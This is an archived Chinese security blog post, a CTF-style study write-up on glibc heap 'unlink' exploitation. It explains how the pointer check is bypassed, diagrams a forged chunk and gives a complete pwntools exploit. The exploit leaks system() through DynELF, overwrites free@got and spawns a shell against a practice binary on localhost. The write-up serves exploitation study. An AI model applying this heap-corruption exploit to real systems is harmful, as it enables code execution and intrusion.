@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<title>heap vuln -- unlink | o0xmuhe's blog</title>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
+<meta content="0x00:起因一直在堆的漏洞利用中不得要领，之前ZCTF又是三个堆的利用，血崩，chxx表哥给写了一个heap的pwn，学习学习。" name="description"/>
+<meta content="article" property="og:type"/>
+<meta content="heap vuln -- unlink" property="og:title"/>
+<meta content="http://o0xmuhe.me/2016/02/15/heap-vuln-unlink/index.html" property="og:url"/>
+<meta content="o0xmuhe's blog" property="og:site_name"/>
+<meta content="0x00:起因一直在堆的漏洞利用中不得要领，之前ZCTF又是三个堆的利用，血崩，chxx表哥给写了一个heap的pwn，学习学习。" property="og:description"/>
+<meta content="http://blogimg-10065924.cos.myqcloud.com/heap_unlink/o_info.png" property="og:image"/>
+<meta content="http://blogimg-10065924.cos.myqcloud.com/heap_unlink/t_sec_check.png" property="og:image"/>
+<meta content="http://blogimg-10065924.cos.myqcloud.com/heap_unlink/o_vuln.png" property="og:image"/>
+<meta content="http://blogimg-10065924.cos.myqcloud.com/heap_unlink/o_getshell.png" property="og:image"/>
+<meta content="2016-10-06T07:27:28.000Z" property="og:updated_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="heap vuln -- unlink" name="twitter:title"/>
+<meta content="0x00:起因一直在堆的漏洞利用中不得要领，之前ZCTF又是三个堆的利用，血崩，chxx表哥给写了一个heap的pwn，学习学习。" name="twitter:description"/>
+<meta content="http://blogimg-10065924.cos.myqcloud.com/heap_unlink/o_info.png" name="twitter:image"/>
+<link href="./heap vuln -- unlink  o0xmuhe's blog/atom.xml" rel="alternative" title="o0xmuhe's blog" type="application/atom+xml"/>
+<link href="./heap vuln -- unlink  o0xmuhe's blog/favicon.png" rel="icon"/>
+<link href="./heap vuln -- unlink  o0xmuhe's blog/animate.min.css" rel="stylesheet"/>
+<link href="./heap vuln -- unlink  o0xmuhe's blog/style.css" rel="stylesheet"/>
+<link href="./heap vuln -- unlink  o0xmuhe's blog/font-awesome.min.css" rel="stylesheet"/>
+<link href="./heap vuln -- unlink  o0xmuhe's blog/apple-touch-icon.png" rel="apple-touch-icon"/>
+<link href="./heap vuln -- unlink  o0xmuhe's blog/jquery.fancybox.css" rel="stylesheet"/>
+<!-- 加载特效 -->
+<script src="./heap vuln -- unlink  o0xmuhe's blog/pace.js"></script>
+<link href="./heap vuln -- unlink  o0xmuhe's blog/pace-theme-flash.css" rel="stylesheet">
+<script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</link></head>
+<body>
+<div id="container">
+<div class="left-col">
+<div class="overlay"></div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="js-avatar" lazy-src="./heap vuln -- unlink  o0xmuhe's blog/head.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/" title="Hi Mate">muhe</a></h1>
+</hgroup>
+<p class="header-subtitle">一个有情怀的二进制狗</p>
+<div class="switch-btn" id="switch-btn">
+<div class="icon">
+<div class="icon-ctn">
+<div class="icon-wrap icon-house" data-idx="0">
+<div class="birdhouse"></div>
+<div class="birdhouse_holes"></div>
+</div>
+<div class="icon-wrap icon-ribbon hide" data-idx="1">
+<div class="ribbon"></div>
+</div>
+<div class="icon-wrap icon-link hide" data-idx="2">
+<div class="loopback_l"></div>
+<div class="loopback_r"></div>
+</div>
+<div class="icon-wrap icon-me hide" data-idx="3">
+<div class="user"></div>
+<div class="shoulder"></div>
+</div>
+</div>
+</div>
+<div class="tips-box hide">
+<div class="tips-arrow"></div>
+<ul class="tips-inner">
+<li>菜单</li>
+<li>标签</li>
+<li>友情链接</li>
+<li>关于我</li>
+</ul>
+</div>
+</div>
+<div class="switch-area" id="switch-area">
+<div class="switch-wrap">
+<section class="switch-part switch-part1">
+<nav class="header-menu">
+<ul>
+<li><a href="/">博客首页</a></li>
+<li><a href="/archives">所有文章</a></li>
+<li><a href="/tags">标签</a></li>
+<li><a href="/about">关于我</a></li>
+<li><a href="/Pwnable-Log">Pwnable</a></li>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fl github" href="https://github.com/o0xmuhe" target="_blank" title="github">github</a>
+<a class="fl weibo" href="http://weibo.com/2070174943/" target="_blank" title="weibo">weibo</a>
+<a class="fl twitter" href="https://twitter.com/0xmuhe" target="_blank" title="twitter">twitter</a>
+<a class="fl rss" href="/atom.xml" target="_blank" title="rss">rss</a>
+</ul>
+</nav>
+</section>
+<section class="switch-part switch-part2">
+<div class="widget tagcloud" id="js-tagcloud">
+<a href="/tags/C/" style="font-size: 10px;">C</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CTF-Writeup/" style="font-size: 10px;">CTF Writeup</a> <a href="/tags/CVE-analysis/" style="font-size: 10px;">CVE analysis</a> <a href="/tags/LLVM/" style="font-size: 10px;">LLVM</a> <a href="/tags/Linux/" style="font-size: 12px;">Linux</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/angr/" style="font-size: 12px;">angr</a> <a href="/tags/ctf/" style="font-size: 18px;">ctf</a> <a href="/tags/ctf-writeup/" style="font-size: 20px;">ctf writeup</a> <a href="/tags/env-config/" style="font-size: 10px;">env config</a> <a href="/tags/exploit/" style="font-size: 16px;">exploit</a> <a href="/tags/fuzz/" style="font-size: 14px;">fuzz</a> <a href="/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/tags/glibc内存管理/" style="font-size: 10px;">glibc内存管理</a> <a href="/tags/life/" style="font-size: 12px;">life</a> <a href="/tags/linux-kernel/" style="font-size: 12px;">linux kernel</a> <a href="/tags/peach/" style="font-size: 10px;">peach</a> <a href="/tags/pwn/" style="font-size: 16px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/ret-2-dl-resolve/" style="font-size: 10px;">ret 2 dl-resolve</a> <a href="/tags/wargame/" style="font-size: 12px;">wargame</a> <a href="/tags/winafl/" style="font-size: 10px;">winafl</a> <a href="/tags/windows-kernel/" style="font-size: 14px;">windows kernel</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a>
+</div>
+</section>
+<section class="switch-part switch-part3">
+<div id="js-friends">
+<a class="main-nav-link switch-friends-link" href="http://syclover.sinaapp.com/" target="_blank">Syclover Team</a>
+<a class="main-nav-link switch-friends-link" href="http://www.Ox9A82.com" target="_blank">0x9A82学弟</a>
+<a class="main-nav-link switch-friends-link" href="http://k1n9.me/" target="_blank">K1n9师傅</a>
+<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy" target="_blank">L3mon</a>
+<a class="main-nav-link switch-friends-link" href="http://www.xianyusec.com" target="_blank">咸鱼</a>
+<a class="main-nav-link switch-friends-link" href="http://v1ct0r.com/" target="_blank">V1ct0r</a>
+<a class="main-nav-link switch-friends-link" href="http://godot.win" target="_blank">Godot学弟</a>
+<a class="main-nav-link switch-friends-link" href="http://hebic.me/" target="_blank">Homaebic学弟</a>
+<a class="main-nav-link switch-friends-link" href="https://iqwq.me" target="_blank">两米的sco4x0</a>
+<a class="main-nav-link switch-friends-link" href="https://zmy.im/" target="_blank">JimmyZhou</a>
+<a class="main-nav-link switch-friends-link" href="http://silic.top/" target="_blank">灭亡叔叔</a>
+<a class="main-nav-link switch-friends-link" href="https://dwx.io" target="_blank">Jason</a>
+<a class="main-nav-link switch-friends-link" href="	http://www.0aa.me/" target="_blank">Mosuan</a>
+<a class="main-nav-link switch-friends-link" href="http://whereisk0shl.top" target="_blank">k0sh1</a>
+<a class="main-nav-link switch-friends-link" href="http://winter3un.github.io" target="_blank">WinterSun</a>
+<a class="main-nav-link switch-friends-link" href="http://venenof.com" target="_blank">Venenof</a>
+<a class="main-nav-link switch-friends-link" href="http://r0p.me/" target="_blank">Icemakr</a>
+<a class="main-nav-link switch-friends-link" href="http://bestwing.me/" target="_blank">Swing</a>
+<a class="main-nav-link switch-friends-link" href="https://www.hackfun.org/" target="_blank">4ido10n</a>
+<a class="main-nav-link switch-friends-link" href="http://www.hackersb.cn/" target="_blank">王松_Striker</a>
+<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/7top/" target="_blank">7top</a>
+<a class="main-nav-link switch-friends-link" href="http://www.bendawang.site" target="_blank">bendawang</a>
+<a class="main-nav-link switch-friends-link" href="http://ctfrank.org" target="_blank">CTF Rank</a>
+<a class="main-nav-link switch-friends-link" href="http://askook.me/" target="_blank">A酱</a>
+</div>
+</section>
+<section class="switch-part switch-part4">
+<div id="js-aboutme">关注二进制安全. Member of Syclover. CTFer/INTJ.</div>
+</section>
+</div>
+</div>
+</header>
+</div>
+</div>
+<div class="mid-col">
+<nav id="mobile-nav">
+<div class="overlay">
+<div class="slider-trigger"></div>
+<h1 class="header-author js-mobile-header hide"><a href="/" title="Me">muhe</a></h1>
+</div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="js-avatar" lazy-src="./heap vuln -- unlink  o0xmuhe's blog/head.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/" title="Me">muhe</a></h1>
+</hgroup>
+<p class="header-subtitle">一个有情怀的二进制狗</p>
+<nav class="header-menu">
+<ul>
+<li><a href="/">博客首页</a></li>
+<li><a href="/archives">所有文章</a></li>
+<li><a href="/tags">标签</a></li>
+<li><a href="/about">关于我</a></li>
+<li><a href="/Pwnable-Log">Pwnable</a></li>
+<div class="clearfix"></div>
+</ul>
+</nav>
+<nav class="header-nav">
+<div class="social">
+<a class="github" href="https://github.com/o0xmuhe" target="_blank" title="github">github</a>
+<a class="weibo" href="http://weibo.com/2070174943/" target="_blank" title="weibo">weibo</a>
+<a class="twitter" href="https://twitter.com/0xmuhe" target="_blank" title="twitter">twitter</a>
+<a class="rss" href="/atom.xml" target="_blank" title="rss">rss</a>
+</div>
+</nav>
+</header>
+</div>
+</nav>
+<div class="body-wrap"><article class="article article-type-post" id="post-heap-vuln-unlink" itemprop="blogPost" itemscope="">
+<div class="article-meta">
+<a class="article-date" href="/2016/02/15/heap-vuln-unlink/">
+<time datetime="2016-02-15T07:21:48.000Z" itemprop="datePublished">2016-02-15</time>
+</a>
+</div>
+<div class="article-inner">
+<input class="isFancy" type="hidden"/>
+<header class="article-header">
+<h1 class="article-title" itemprop="name">
+      heap vuln -- unlink
+    </h1>
+</header>
+<div class="article-info article-info-post">
+<div class="article-tag tagcloud">
+<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+</div>
+<div class="clearfix"></div>
+</div>
+<div class="article-entry" itemprop="articleBody">
+<h4 id="0x00-起因"><a class="headerlink" href="#0x00-起因" title="0x00:起因"></a>0x00:起因</h4><p>一直在堆的漏洞利用中不得要领，之前ZCTF又是三个堆的利用，血崩，chxx表哥给写了一个heap的pwn，学习学习。<br/><a id="more"></a></p>
+<h4 id="0x01"><a class="headerlink" href="#0x01" title="0x01:"></a>0x01:</h4><p>关于heap的unlink的漏洞利用，出的很早，在低版本的libc中，因为没有校验，导致在unlink的时候可以通过构造堆块dwordshoot，从而任意代码执行。<br/>对于这种漏洞的学习，首先要了解malloc的工作原理及几种堆块的分配、使用方式。推荐文章 <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" rel="external" target="_blank">Understanding glibc malloc</a></p>
+<h4 id="0x02-文件信息"><a class="headerlink" href="#0x02-文件信息" title="0x02:文件信息"></a>0x02:文件信息</h4><p><img alt="" src="./heap vuln -- unlink  o0xmuhe's blog/o_info.png"/></p>
+<p><img alt="" src="./heap vuln -- unlink  o0xmuhe's blog/t_sec_check.png"/></p>
+<h4 id="0x03-分析"><a class="headerlink" href="#0x03-分析" title="0x03:分析"></a>0x03:分析</h4><p>程序是一个菜单式的程序，可以用户自定义分配块的长度和内容，漏洞在于：edit的时候，没做长度校验导致可以溢出，通过构造可以bypass 在libc中unlink的校验，从而getshell。<br/><img alt="" src="./heap vuln -- unlink  o0xmuhe's blog/o_vuln.png"/></p>
+<h4 id="0x04-在drops看到的姿势"><a class="headerlink" href="#0x04-在drops看到的姿势" title="0x04:在drops看到的姿势"></a>0x04:在drops看到的姿势</h4><p><a href="http://drops.wooyun.org/tips/7326" rel="external" target="_blank">堆溢出的unlink利用方法</a><br/>按照文中给出的方式，为了bypass<br/><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</div><div class="line">4malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P);</div></pre></td></tr></table></figure></p>
+<p>这么一个指针的校验，我们找到一个特殊的 指针ptr是指向p的(p指向堆)<br/>那么可以根据p去构造bk和fd两个指针</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">chunk0                malloc返回的ptr           chunk1        malloc返回的ptr</div><div class="line">|<span class="string">                     </span>|<span class="string">                        </span>|<span class="string">             </span>|</div><div class="line">+-----------+---------+----+----+----+----+----+------+------+----+----+------+</div><div class="line">|<span class="string">           </span>|<span class="string">         </span>|<span class="string">fake</span>|<span class="string">fake</span>|<span class="string">fake</span>|<span class="string">fake</span>|<span class="string"> D  </span>|<span class="string"> fake </span>|<span class="string"> fake </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">      </span>|</div><div class="line">|<span class="string">           </span>|<span class="string">         </span>|<span class="string">prev</span>|<span class="string">size</span>|<span class="string"> FD </span>|<span class="string"> BK </span>|<span class="string"> A  </span>|<span class="string"> prev </span>|<span class="string"> size&amp;</span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">      </span>|</div><div class="line">|<span class="string"> prev_size </span>|<span class="string">size&amp;Flag</span>|<span class="string">size</span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string"> T  </span>|<span class="string"> size </span>|<span class="string"> flag </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">      </span>|</div><div class="line">|<span class="string">           </span>|<span class="string">         </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string"> A  </span>|<span class="string">      </span>|<span class="string">      </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">      </span>|</div><div class="line">|<span class="string">           </span>|<span class="string">         </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">      </span>|<span class="string">      </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">      </span>|</div><div class="line">+-----------+---------+----+----+----+----+----+------+------+----+----+------+</div><div class="line">                      |<span class="string">--------new_size--------</span>|</div><div class="line">                      list</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">l32(<span class="number">0</span>)  +  l32(<span class="number">0x89</span>)  +  l32(list<span class="number">-0xc</span>) + l32(list<span class="number">-0x8</span>) +<span class="string">"A"</span>*(<span class="number">128</span><span class="number">-4</span>*<span class="number">4</span>)</div><div class="line"><span class="comment">#fake_pre_szie + fake_size + fake_FD + fake_BK + DATA</span></div><div class="line"><span class="comment">#   4bytes        4bytes     4bytes    4bytes    128-4*4</span></div><div class="line"><span class="comment">#pre_size   +   size&amp;flag</span></div><div class="line">l32(<span class="number">0x80</span>) + l32(<span class="number">0x88</span>)</div><div class="line">free(chunk_1)</div></pre></td></tr></table></figure>
+<p>分配两个长度合适的块，伪造第一个块，然后通过修改了第二个块的pre_size 和size<br/>然后free(chunk1) 触发unlink</p>
+<p>之后再次修改指针p 从而达到leak地址，修改地址的目的</p>
+<h4 id="0x05-exp"><a class="headerlink" href="#0x05-exp" title="0x05:exp"></a>0x05:exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.update(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>)</div><div class="line">p = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10001</span>)</div><div class="line">chunk_list = <span class="number">0x8049d60</span></div><div class="line">free_got = <span class="number">0x8049ce8</span></div><div class="line">flag = <span class="number">0</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></div><div class="line">    data = <span class="string">"A"</span> * <span class="number">0xc</span> + p32(chunk_list<span class="number">-0xc</span>) + p32(addr)</div><div class="line">    <span class="keyword">global</span> flag</div><div class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</div><div class="line">        set_chunk(<span class="number">0</span>, data)</div><div class="line">        flag = <span class="number">1</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        set_chunk2(<span class="number">0</span>, data)</div><div class="line">    res = <span class="string">""</span></div><div class="line">    p.recvuntil(<span class="string">'5.Exit\n'</span>)</div><div class="line">    res = print_chunk(<span class="number">1</span>)</div><div class="line">    print(<span class="string">"leaking: %#x ---&gt; %s"</span> % (addr, res[<span class="number">0</span>:<span class="number">4</span>].encode(<span class="string">'hex'</span>)))</div><div class="line">    <span class="keyword">return</span> res[<span class="number">0</span>:<span class="number">4</span>]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_chunk</span><span class="params">(len)</span>:</span></div><div class="line">4<span class="keyword">print</span> p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">4p.sendline(<span class="string">'1'</span>)</div><div class="line">4<span class="keyword">print</span> p.recvuntil(<span class="string">'Input the size of chunk you want to add:'</span>)</div><div class="line">4p.sendline(str(len))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_chunk</span><span class="params">(index,data)</span>:</span></div><div class="line">4p.recvuntil(<span class="string">'5.Exit\n'</span>)</div><div class="line">4p.sendline(<span class="string">'2'</span>)</div><div class="line">4p.recvuntil(<span class="string">'Set chunk index:'</span>)</div><div class="line">4p.sendline(str(index))</div><div class="line">4p.recvuntil(<span class="string">'Set chunk data:'</span>)</div><div class="line">4p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_chunk2</span><span class="params">(index, data)</span>:</span></div><div class="line">    p.sendline(<span class="string">'2'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Set chunk index:'</span>)</div><div class="line">    p.sendline(str(index))</div><div class="line">    p.recvuntil(<span class="string">'Set chunk data:'</span>)</div><div class="line">    p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_chunk</span><span class="params">(index)</span>:</span></div><div class="line">4p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">4p.sendline(<span class="string">'3'</span>)</div><div class="line">4p.recvuntil(<span class="string">'Delete chunk index:'</span>)</div><div class="line">4p.sendline(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_chunk</span><span class="params">(index)</span>:</span></div><div class="line">4p.sendline(<span class="string">'4'</span>)</div><div class="line">4p.recvuntil(<span class="string">'Print chunk index:'</span>)</div><div class="line">4p.sendline(str(index))</div><div class="line">4res = p.recvuntil(<span class="string">'5.Exit\n'</span>)</div><div class="line">4<span class="keyword">return</span> res</div><div class="line">raw_input(<span class="string">'add_chunk'</span>)</div><div class="line">add_chunk(<span class="number">128</span>)  <span class="comment">#0</span></div><div class="line">add_chunk(<span class="number">128</span>)	<span class="comment">#1</span></div><div class="line">add_chunk(<span class="number">128</span>)	<span class="comment">#2</span></div><div class="line">add_chunk(<span class="number">128</span>)	<span class="comment">#3</span></div><div class="line">set_chunk(<span class="number">3</span>, <span class="string">'/bin/sh'</span>)</div><div class="line"><span class="comment">#fake_chunk</span></div><div class="line">payload = <span class="string">""</span></div><div class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0x89</span>) + p32(chunk_list<span class="number">-0xc</span>) + p32(chunk_list<span class="number">-0x8</span>)</div><div class="line">payload += <span class="string">"A"</span>*(<span class="number">0x80</span><span class="number">-4</span>*<span class="number">4</span>)</div><div class="line"><span class="comment">#2nd chunk </span></div><div class="line">payload += p32(<span class="number">0x80</span>) + p32(<span class="number">0x88</span>)</div><div class="line">set_chunk(<span class="number">0</span>,payload)</div><div class="line"><span class="comment">#get the pointer</span></div><div class="line">del_chunk(<span class="number">1</span>)</div><div class="line">set_chunk(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">12</span> + p32(<span class="number">0x8049d54</span>) + p32(<span class="number">0x8049d14</span>))</div><div class="line">raw_input(<span class="string">'leak'</span>)</div><div class="line"><span class="comment">#leak system_addr</span></div><div class="line">pwn_elf = ELF(<span class="string">'./heap'</span>)</div><div class="line">d = DynELF(leak, elf=pwn_elf)</div><div class="line">sys_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</div><div class="line">print(<span class="string">"system addr: %#x"</span> % sys_addr)</div><div class="line">raw_input(<span class="string">'edit free@got'</span>)</div><div class="line">data = <span class="string">"A"</span> * <span class="number">12</span> + p32(chunk_list<span class="number">-0xc</span>) + p32(free_got)</div><div class="line">set_chunk2(<span class="string">'0'</span>, data)</div><div class="line">set_chunk2(<span class="string">'1'</span>, p32(sys_addr))</div><div class="line">del_chunk(<span class="string">'3'</span>)</div><div class="line">p.interactive()</div><div class="line">p.close()</div></pre></td></tr></table></figure>
+<p><img alt="" src="./heap vuln -- unlink  o0xmuhe's blog/o_getshell.png"/></p>
+<h4 id="0x06-参考"><a class="headerlink" href="#0x06-参考" title="0x06:参考"></a>0x06:参考</h4><ol>
+<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" rel="external" target="_blank">Understanding glibc malloc</a></li>
+<li><a href="http://drops.wooyun.org/tips/7326" rel="external" target="_blank">堆溢出的unlink利用方法</a></li>
+</ol>
+<ul>
+<li>最后还要感谢chxx大表哥的pwn和指导=。=</li>
+<li>所有文件都在这里了 <a href="https://github.com/o0xmuhe/heap_pwn_study" rel="external" target="_blank">文件下载</a></li>
+</ul>
+</div>
+</div>
+<div class="copyright">
+<p><span>本文标题:</span><a href="/2016/02/15/heap-vuln-unlink/">heap vuln -- unlink</a></p>
+<p><span>文章作者:</span><a href="/" title="访问 muhe 的个人博客">muhe</a></p>
+<p><span>发布时间:</span>2016年02月15日 - 15时21分</p>
+<p><span>最后更新:</span>2016年10月06日 - 15时27分</p>
+<p>
+<span>原始链接:</span><a class="post-url" href="/2016/02/15/heap-vuln-unlink/" title="heap vuln -- unlink">http://o0xmuhe.me/2016/02/15/heap-vuln-unlink/</a>
+<span class="copy-path" data-clipboard-text="原文: http://o0xmuhe.me/2016/02/15/heap-vuln-unlink/　　作者: muhe" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+<script src="./heap vuln -- unlink  o0xmuhe's blog/clipboard.min.js"></script>
+<script> var clipboard = new Clipboard('.copy-path'); </script>
+</p>
+<p>
+<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="license" target="_blank" title="中国大陆 (CC BY-NC-SA 3.0 CN)">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+</div>
+<nav id="article-nav">
+<a class="article-nav-link-wrap" href="/2016/04/30/cctf-pwn350/" id="article-nav-newer">
+<strong class="article-nav-caption">&lt;</strong>
+<div class="article-nav-title">
+        
+          cctf pwn350
+        
+      </div>
+</a>
+<a class="article-nav-link-wrap" href="/2015/12/02/format-string-with-stack-frame/" id="article-nav-older">
+<div class="article-nav-title">format string with stack frame</div>
+<strong class="article-nav-caption">&gt;</strong>
+</a>
+</nav>
+</article>
+<div class="toc-article" id="toc">
+<strong class="toc-title">文章目录</strong>
+<ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-起因"><span class="toc-number">1.</span> <span class="toc-text">0x00:起因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01"><span class="toc-number">2.</span> <span class="toc-text">0x01:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-文件信息"><span class="toc-number">3.</span> <span class="toc-text">0x02:文件信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-分析"><span class="toc-number">4.</span> <span class="toc-text">0x03:分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-在drops看到的姿势"><span class="toc-number">5.</span> <span class="toc-text">0x04:在drops看到的姿势</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05-exp"><span class="toc-number">6.</span> <span class="toc-text">0x05:exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x06-参考"><span class="toc-number">7.</span> <span class="toc-text">0x06:参考</span></a></li></ol>
+</div>
+<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
+<script src="./heap vuln -- unlink  o0xmuhe's blog/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+<div class="bdsharebuttonbox">
+<a class="fx fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
+<a class="fx fa-weixin bds_weixin" data-cmd="weixin" href="#" title="分享到微信"></a>
+<a class="fx fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享到QQ好友"></a>
+<a class="fx fa-facebook-official bds_fbook" data-cmd="fbook" href="#" title="分享到Facebook"></a>
+<a class="fx fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到Twitter"></a>
+<a class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" href="#" title="分享到linkedin"></a>
+<a class="fx fa-files-o bds_copy" data-cmd="copy" href="#" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+<div class="duoshuo" id="comments">
+<!-- 多说评论框 start -->
+<div class="ds-thread" data-thread-key="2016/02/15/heap-vuln-unlink/" data-title="heap vuln -- unlink" data-url="http://o0xmuhe.me/2016/02/15/heap-vuln-unlink/"></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    var duoshuoQuery = {short_name:"o0xmuhe"};
+    (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '/js/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+    </script>
+<!-- 多说公共JS代码 end -->
+</div>
+<div class="scroll" id="post-nav-button">
+<a href="/2016/04/30/cctf-pwn350/" title="上一篇: cctf pwn350">
+<i class="fa fa-angle-left"></i>
+</a>
+<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+<a href="/2015/12/02/format-string-with-stack-frame/" title="下一篇: format string with stack frame">
+<i class="fa fa-angle-right"></i>
+</a>
+</div>
